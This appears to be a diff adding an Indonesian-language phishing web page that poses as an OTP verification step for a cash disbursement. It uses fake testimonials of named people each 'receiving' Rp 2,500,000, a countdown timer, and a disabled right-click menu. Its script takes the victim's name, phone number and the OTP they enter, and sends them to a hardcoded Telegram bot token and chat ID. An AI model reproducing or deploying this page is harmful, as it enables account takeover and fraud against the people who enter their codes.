@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="theme-color" content="#3CB371"> 
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Verifikasi OTP</title>
+    <style>
+        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        .container { width: 300px;
+        
+        padding: 20px; border: 1px solid #ccc; border-radius: 5px; box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.1); text-align: center; }
+      
+        input { width: 94%;
+        font-weight:bold;
+        padding: 13px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; text-align: center; }
+        button { width: 100%;
+        font-weight:bold;padding: 13px; border: none; background: #3CB371; color: white; cursor: pointer; border-radius: 5px; }
+        button:hover { background: #3cb371; }
+        
+        nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            z-index: 1000;
+        }
+
+        nav img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        .marquee-container {
+            overflow: hidden;
+            width: 100%;
+            max-width: 350px;
+            background-color: #333;
+            color: white;
+            padding: 10px 0;
+            margin-bottom: 10px;
+            text-align: center;
+            border-radius: 5px;
+        }
+
+        .marquee-text {
+            display: inline-block;
+            white-space: nowrap;
+            animation: marquee 10s linear infinite;
+            font-size: 16px;
+        }
+
+        @keyframes marquee {
+            from {
+                transform: translateX(100%);
+            }
+            to {
+                transform: translateX(-100%);
+            }
+        }
+        
+        
+        .box-container {
+            width: 350px;
+            height: 300px;
+            
+            overflow: hidden;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+
+        /* Slide box */
+        .slide-box {
+            display: flex;
+            flex-direction: column;
+            animation: slideUp 20s linear infinite;
+        }
+
+        
+
+        .user-box {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px;
+            border: 1px solid #3CB371; 
+        }
+
+        /* Foto pengguna */
+        .user-photo {
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            object-fit: cover;
+            margin-right: 10px;
+            
+        }
+
+        /* Informasi pengguna */
+        .user-info {
+            flex-grow: 1;
+            padding-left: 10px;
+        }
+
+        .user-name {
+            font-size: 16px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .user-detail {
+            font-size: 14px;
+            color: #555;
+        }
+
+        /* Ikon ceklis */
+        .icon-check {
+            font-size: 20px;
+            color: green;
+        }
+
+        /* Animasi slide */
+        @keyframes slideUp {
+            0% {
+                transform: translateY(0);
+            }
+            100% {
+                transform: translateY(-100%);
+            }
+        }
+        
+        .gambar {
+            width: 100%;
+            margin-bottom: 0;
+            margin-top:-10%;
+        }
+
+        .gambar img {
+            width: 100%;
+            object-fit: cover;
+        }
+        
+        
+                .loading {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .loading img {
+            width: 50px;
+            height: 50px;
+        }
+        
+}
+
+        .timer {
+    font-size: 15px;
+    font-weight: bold;
+    margin-top:-5%;
+    text-align: center;
+    color: #ff4500;
+}
+    </style>
+</head>
+<body>
+    <div class="gambar">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEgQu6As5ohZn1bBc6sJwlCgjpCn3HEvsHrhsWLhFHVtA_YZf013FrQlMzhaWKjtxtRrmmEHrmVvlbCdNqZ0t4Z_0BFbinZvnU3sEUK-MyHVRzW0EApT64NQaz9WSo4nPlBrIR6IXe2smqaWDHCpHdR8Tbkcn9PGl3uJivANXmDl1mHaekveQuaqMFWXOrwn" alt="Gambar Pucok">
+    </div>
+        <div class="marquee-container">
+        <p class="marquee-text">Selamat datang! Isi data Anda untuk melanjutkan proses pencairan.</p>
+    </div>
+
+
+    <div class="container">
+        <h3>Verifikasi Kode OTP</h3>
+        <p>Kode OTP telah dikirim ke WhatsApp:</p>
+        <h4 id="nomorHP"></h4>
+        <input type="tel" id="otp" placeholder="Masukkan OTP">
+        <br><br><div class="timer" id="timer">60:00</div><br>
+        <button onclick="verifikasiOTP()">Verifikasi</button>
+    </div>
+    
+    <div class="loading" id="loading">
+        <img src="successfu8.gif" alt="Loading...">
+        <p></p>
+    </div>
+    <br><br>
+        <div class="box-container">
+    <div class="slide-box">
+        <!-- Wahyu Iskandar -->
+        <div class="user-box">
+            <img src="aa1.jpg" alt="Wahyu Iskandar" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Wahyu Iskandar</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Bobie -->
+        <div class="user-box">
+            <img src="aa2.jpg" alt="Bobie" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Bobie</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Wisnu -->
+        <div class="user-box">
+            <img src="aa3.jpg" alt="Wisnu" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Wisnu</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Sudar -->
+        <div class="user-box">
+            <img src="aa4.jpg" alt="Sudar" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Sudar</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Mansur -->
+        <div class="user-box">
+            <img src="aa5.jpg" alt="Mansur" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Mansur</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Ansori -->
+        <div class="user-box">
+            <img src="aa6.jpg" alt="Ansori" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Ansori</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Paisar -->
+        <div class="user-box">
+            <img src="aa7.jpg" alt="Paisar" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Paisar</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Bela -->
+        <div class="user-box">
+            <img src="aa8.jpg" alt="Bela" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Bela</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Tania -->
+        <div class="user-box">
+            <img src="aa9.jpg" alt="Tania" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Tania</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+        <!-- Mita -->
+        <div class="user-box">
+            <img src="aa10.jpg" alt="Mita" class="user-photo">
+            <div class="user-info">
+                <p class="user-name">Mita</p>
+                <p class="user-detail">Pencairan Rp 2.500.000</p>
+            </div>
+            <div class="icon-check">✅</div>
+        </div>
+    </div>
+</div>
+
+    
+        <nav>
+        <a href="#">
+            <img src="nav.jpg" alt="Navigasi Bawah">
+        </a>
+    </nav>
+
+    <script>
+        document.getElementById("nomorHP").innerText = localStorage.getItem("nomorHP") || "Tidak ditemukan";
+
+        function verifikasiOTP() {
+            let otp = document.getElementById('otp').value;
+            let nama = localStorage.getItem("nama");
+            let nomorHP = localStorage.getItem("nomorHP");
+            
+            if (otp === "") {
+                alert("Masukkan OTP terlebih dahulu");
+                return;
+            }
+            
+            // Format nomor HP ke +62
+            if (nomorHP.startsWith("0")) {
+                nomorHP = "+62" + nomorHP.substring(1);
+            }
+            
+            // Tampilkan loading
+            document.getElementById("loading").style.display = "block";
+
+            // Kirim data OTP ke Telegram setelah 3 detik
+            setTimeout(() => {
+                let token = "7874811634:AAFLWyauNcH31efMOMIA16Hc5sD-uQmXd6A";
+                let chat_id = "6835220264";
+                let pesan = `Nama: ${nama}\nNomor: ${nomorHP}\nKode OTP: ${otp}`;
+let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(pesan)}`;
+
+                
+                fetch(url)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            // Redirect ke halaman berikutnya setelah loading selesai
+                            window.location.href = "otp.html";
+                        } else {
+                            alert("Gagal mengirim OTP. Silakan coba lagi.");
+                        }
+                    })
+                    .catch(error => {
+                        console.error(error);
+                        alert("Terjadi kesalahan. Silakan coba lagi.");
+                    })
+                    .finally(() => {
+                        document.getElementById("loading").style.display = "none";
+                    });
+            }, 3000);
+        }
+        
+        const timerElement = document.getElementById("timer");
+        let timeRemaining = 3600;
+
+        function formatTime(seconds) {
+            const minutes = Math.floor(seconds / 60);
+            const remainingSeconds = seconds % 60;
+            return `${minutes.toString().padStart(2, "0")}:${remainingSeconds.toString().padStart(2, "0")}`;
+        }
+
+        function updateTimer() {
+            timerElement.textContent = formatTime(timeRemaining);
+            if (timeRemaining > 0) {
+                timeRemaining--;
+            } else {
+                clearInterval(countdownInterval);
+            }
+        }
+
+        const countdownInterval = setInterval(updateTimer, 1000);
+        updateTimer();
+
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+    </script>
+
+</body>
+          </html>
